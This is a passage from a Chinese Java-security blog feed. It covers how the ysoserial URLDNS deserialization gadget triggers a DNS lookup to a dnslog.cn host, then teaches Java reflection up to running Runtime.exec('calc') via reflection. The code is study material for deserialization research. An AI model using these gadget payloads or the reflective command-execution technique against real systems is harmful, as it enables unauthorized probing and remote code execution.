http:<span class="hljs-comment">//zdvh1d.dnslog.cn &gt; URLDNS.bin</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unSerialize</span><span class="hljs-params">(String filename)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileIn);<br>            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) in.readObject();<br>            in.close();<br>            fileIn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        unSerialize(<span class="hljs-string">&quot;URLDNS.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用 <code>hash()</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309042251288.png" alt="image-20230904225136239"></p><p><code>hash()</code> 调用 <code>URL</code> 实例的 <code>hashCode()</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309042248556.png" alt="image-20230904224853526"></p><p><code>hashCode</code> 为 -1，调用 <code>URLStreamHandler.hashCode()</code> 方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309042252978.png" alt="image-20230904225211942"></p><p> <code>URLStreamHandler.hashCode()</code> 中调用了 <code>getHostAddress()</code> 获取地址，这其实就是进行了一次 DNS 请求：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309042259744.png" alt="image-20230904225914688"></p><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>看一下 <code>ysoserial</code> 中 URLDNS 的 Payload 生成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <br>    ht.put(u, url); <br>    Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <br>    <span class="hljs-keyword">return</span> ht;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里其实就创建一个 URL 实例，作为 key 添加到 HashMap 中，然后设置 hashCode 为 -1，从而可以调用 <code>URLStreamHandler.hashCode()</code> 方法。</p><p> <code>ysoserial</code> 是重写了一下 <code>URLStreamHandler</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为 <code>put()</code> 方法实际还是调用了 <code>hash()</code> 方法，那么就会又调用一次  <code>getHostAddress()</code>  进行 dns 请求，那么就在生成 payload 就会发起了 dns ，上面重写 <code>URLStreamHandler</code> 中的 <code>getHostAddress()</code> ，使其返回为空，那么在生成 payload 时不会发起 dns 请求了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 反射机制</title>
    <link href="/2023/07/31/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/07/31/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反射机制"><a href="#Java-反射机制" class="headerlink" title="Java 反射机制"></a>Java 反射机制</h1><p>在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种动态获取的信息以及动态调用对象的方法的功能称为 Java 语言的反射机制。</p><h2 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h2><p>每个  Java  类运行时都在JVM里表现为一个 <code>class </code>对象，这个 <code>class</code> 对象中包含这个类的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等。</p><p>类的加载：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926120.png" alt="https://pdai.tech/images/java/java-basic-reflection-3.png"></p><p><code>class</code> 对象中包含着该类的所有信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926122.png" alt="image-20230610135459375"></p><h2 id="获取-Class-对象"><a href="#获取-Class-对象" class="headerlink" title="获取 Class 对象"></a>获取 Class 对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-comment">// 1. 直接获取类的 class 属性</span><br>        System.out.println(<span class="hljs-string">&quot;Person.class =&gt; &quot;</span>+ Person.class);<br>        <span class="hljs-comment">// 2. 通过类的对象的 getClass() 方法</span><br>        System.out.println(<span class="hljs-string">&quot;p.getClass() =&gt; &quot;</span>+ p.getClass());<br>        <span class="hljs-comment">// 3. 通过 Class 对象的 forName() 方法</span><br>        System.out.println(<span class="hljs-string">&quot;Class.forName(\&quot;Person\&quot;) =&gt; &quot;</span>+ Class.forName(<span class="hljs-string">&quot;Person&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926127.png" alt="image-20230610144014058"></p><p>这里获取到了 <code>Person</code> 类，从上面 “类的加载” 图中可以看出，每个 java 类其实都是一个 <code>Class</code> 类的对象，那么这个 <code>Person</code> 类也就是 <code>Class</code> 类的对象。我们可以再对这个对象进行获取类：</p><p>那么它们也就可以使用 <code>getClass()</code> 和 <code>forName(&quot;Person&quot;)</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-comment">// 1. 获取 Person.class 的类, 这里的 Person.class 其实就是 Class 对象</span><br>        System.out.println(<span class="hljs-string">&quot;Person.class.getClass() =&gt; &quot;</span>+ Person.class.getClass());<br>        <span class="hljs-comment">// 2. 通过 Class 对象调用 forName() 方法指定类名获取类</span><br>        System.out.print(<span class="hljs-string">&quot;Person.class.forName(\&quot;java.lang.Runtime\&quot;) =&gt; &quot;</span>);<br>        System.out.println(Person.class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926126.png" alt="image-20230610143918495"></p><p><code>Class.forName()</code> 方法是有几个函数重载的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926128.png" alt="image-20230610145405194"></p><p>总共是有 3 个，它们的内部调用的其实是一个 本地方法 <code>forName0() </code></p><p>这个本地方法的目的是根据传入的参数加载指定的类并返回对应的 <code>Class</code> 对象。</p><ul><li><code>name</code>：要加载的类的全限定名。</li><li><code>initialize</code>：一个布尔值，指示是否在加载类之前进行初始化。<ul><li>如果为 <code>true</code>，则执行类的静态初始化块；</li><li>如果为 <code>false</code>，则不进行初始化。</li></ul></li><li><code>loader</code>：要使用的类加载器。它指定了加载类的特定类加载器，如果为 <code>null</code>，则使用默认的类加载器（ 根据类名加载 ）。</li><li><code>caller</code>：调用者类，用于判断安全上下文。</li></ul><p>而 <code>Class.forName(String)</code> 这个方法，其内部其实 <code>initialize</code>  是为 <code>true </code> 的，也就是在使用  <code>Class.forName(String)</code>  时，该类会进行初始化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@CallerSensitive</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String className)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    Class&lt;?&gt; caller = Reflection.getCallerClass();<br>    <span class="hljs-keyword">return</span> forName0(className, <span class="hljs-literal">true</span>, ClassLoader.getClassLoader(caller), caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>当类初始化时，它会执行类中的 <code>静态代码块</code> 和 <code>静态变量初始化</code> ，格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>    <span class="hljs-comment">// 静态变量初始化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">staticVariable</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">// 静态代码块执行</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;staticVariable =&gt; &quot;</span>+ staticVariable);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们通过 <code>Class.forName(String)</code> 调用该类，<code>static&#123;&#125;</code> 就会执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;MyClass&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926133.png" alt="image-20230610151855365"></p><h2 id="访问字段"><a href="#访问字段" class="headerlink" title="访问字段"></a>访问字段</h2><p>对任意的一个 <code>Object</code> 实例，只要我们获取了它的 <code>Class</code> ，就可以获取它的一切信息。</p><p>这里先获取字段的 <code>Field </code> 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">// 获取 Person 类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-comment">// 1. getField(name) 获取 public 字段</span><br>        System.out.println(personClass.getField(<span class="hljs-string">&quot;name&quot;</span>));<br>        <span class="hljs-comment">// 2. getDeclaredField(name) 获取 private/public 字段 </span><br>        <span class="hljs-comment">// ( Declared 的都包括父类, 不加的不包括 )</span><br>        System.out.println(personClass.getDeclaredField(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        <span class="hljs-comment">// 3. getFields() 获取所有 public 字段</span><br>        System.out.println(Arrays.toString(personClass.getFields()));<br>        <span class="hljs-comment">// 4. getDeclaredFields() 获取所有字段</span><br>        System.out.println(Arrays.toString(personClass.getDeclaredFields()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309041926609.png" alt="image-20230610160844805"></p><p><code>Field</code> 对象常用的方法：</p><ul><li><code>getName()</code>: 获取字段的名称。</li><li><code> getType()</code>: 获取字段的类型，返回一个 <code>Class</code> 对象。</li><li><code>getModifiers()</code>: 获取字段的修饰符，返回一个代表修饰符的整数值。</li><li><code>get(Object obj)</code>: 获取指定对象中该字段的值，如果字段为静态字段，可以将 <code>obj</code> 参数设为 <code>null</code>。</li><li><code>set(Object obj, Object value)</code>: 将指定对象中该字段的值设置为给定的值，如果字段为静态字段，可以将 <code>obj</code> 参数设为 <code>null</code>。</li><li><code>isAccessible()</code>: 判断字段是否可访问，返回一个布尔值。</li><li><code>setAccessible(boolean flag)</code>: 设置字段的可访问性，如果参数为 <code>true</code>，则可绕过访问权限进行访问。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 获取 Person 类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">priName</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;priName&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;pri&quot;</span>);<br>        <span class="hljs-comment">// private 类型, 需要设置字段的可访问性</span><br>        priName.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 设置值</span><br>        priName.set(p,<span class="hljs-string">&quot;pirNameTestSet&quot;</span>);<br>        <span class="hljs-comment">// 打印值</span><br>        System.out.println(<span class="hljs-string">&quot;priName =&gt; &quot;</span> +priName.get(p));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><p>获取类的方法对象 <code>Method</code> ：</p><ul><li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li><li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><p><code>Method</code> 对象常用方法：</p><ul><li><code>getName()</code>: 获取方法的名称。</li><li><code>getReturnType()</code>: 获取方法的返回类型，返回一个<code>Class</code>对象。</li><li><code>getParameterTypes()</code>: 获取方法的参数类型，返回一个<code>Class</code>对象数组。</li><li><code>getModifiers()</code>: 获取方法的修饰符，返回一个代表修饰符的整数值。</li><li><code>invoke(Object obj, Object... args)</code>: 调用该方法，将参数<code>obj</code>指定的对象作为方法的调用者，如果方法是静态方法，可以将此参数设置为 <code>null</code>，因为静态方法不依赖于特定的对象实例，<code>args</code>是方法的参数列表。</li><li><code>isAccessible()</code>: 判断方法是否可访问，返回一个布尔值。</li><li><code>setAccessible(boolean flag)</code>: 设置方法的可访问性，如果参数为<code>true</code>，则可绕过访问权限进行调用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 获取 class 对象</span><br>        Class&lt;?&gt; person = Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-comment">// 1. 获取 Person 对象中的 rce 方法, 参数为 string 类型</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">rce</span> <span class="hljs-operator">=</span> person.getMethod(<span class="hljs-string">&quot;rce&quot;</span>, String.class);<br>        <span class="hljs-comment">// 2. 使用 invoke() 执行方法</span><br>        rce.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里在利用反射调用达到命令执行的效果：</p><p>Java 中的命令执行方法：<code>Runtime.getRuntime().exec()</code></p><p>看一下 <code>Runtime</code> 包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-comment">// 静态变量, new Runtime() 创建对象, 赋值给 currentRuntime</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Runtime</span> <span class="hljs-variable">currentRuntime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runtime</span>();<br>    <span class="hljs-comment">// 静态方法 getRuntime() 获取这个静态变量实例, 其实就是获取一个 Runtime 的对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Runtime <span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> currentRuntime;<br>    &#125;<br>    <span class="hljs-comment">// exec() 命令执行函数, 非静态, 需要对象</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> exec(command, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在使用 <code>invoke</code> 调用方法时，需要去创建一个 <code>Runtime</code> 类的实例作为参数，然后再去执行函数。这个实例需要去创建。</p><p>而 <code>Runtime</code> 类中的 <code>静态变量</code> 就相当于一个构造方法，恰巧使用 <code>Class.forName</code> 时，类会有一个初始化操作， <code>静态变量</code>  会在初始化时执行。而 <code>getRuntime() </code> 又只是一个静态方法，不需要对象就可以执行。</p><p>接下来可以通过 <code>getMethod</code> 获取 <code>exec()</code> 方法，再通过 <code>getRuntime()</code> 方法获取 <code>Runtime</code> 实例对象，就可以执行命令了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. 加载 java.lang.Runtime 类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">// 2. 获取 exec(string) 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-comment">// 3. 获取 Runtime 对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 4. 执行命令</span><br>        exec.invoke(getRuntime,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h2><p><code>Class.newInstance()</code> 调用（ 只能调用该类的 <code>public </code>无参数构造方法 ）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException,IllegalAccessException, InstantiationException &#123;<br>        Class&lt;?&gt; person = Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-comment">// 直接调用 newInstance() 方法</span><br>        person.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>Constructor</code> 对象的<code>newInstance()</code> 方法，这样可以返回一个对象：</p><p>通过Class实例获取Constructor的方法如下：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;<br>        Class&lt;?&gt; person = Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-comment">// 1. 获取 Constructor 对象, 参数为 String 类型</span><br>        Constructor&lt;?&gt; constructor = person.getConstructor(String.class);<br>        <span class="hljs-comment">// 2. 调用 Constructor 对象的 newInstance() 方法</span><br>        <span class="hljs-comment">//  返回一个 Object 对象, 类型转换为 Person 对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Person) constructor.newInstance(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-comment">// 3. 调用 